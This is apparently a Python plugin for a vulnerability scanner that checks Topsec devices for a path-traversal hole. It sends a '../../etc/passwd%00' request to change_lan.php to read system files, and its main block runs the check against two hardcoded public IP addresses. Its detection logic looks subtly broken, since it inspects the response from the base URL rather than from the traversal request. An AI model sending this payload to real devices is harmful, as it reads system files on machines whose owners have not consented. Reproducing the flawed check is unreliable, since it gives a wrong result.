#!/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0118464
#__Author__ = 上善若水
#_PlugName_ = topsec Plugin
#_FileName_ = topsec.py


def assign(service, arg):
    if service == "topsec":
        return True, arg    

def audit(arg):
    url = arg + "change_lan.php?LanID=../../../../../../../../../etc/passwd%00"
    code1, head1, res1, errcode1, _url1 = curl.curl2(url)
    code2, head2, res2, errcode2, _url2 = curl.curl2(arg)
    if code1 == 302 and 'root:/tmp:/bin/ash' in res2: 
        security_hole(url)
            
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('topsec', 'http://61.148.24.182:8080/')[1])
    audit(assign('topsec', 'http://61.54.222.43:8080/')[1])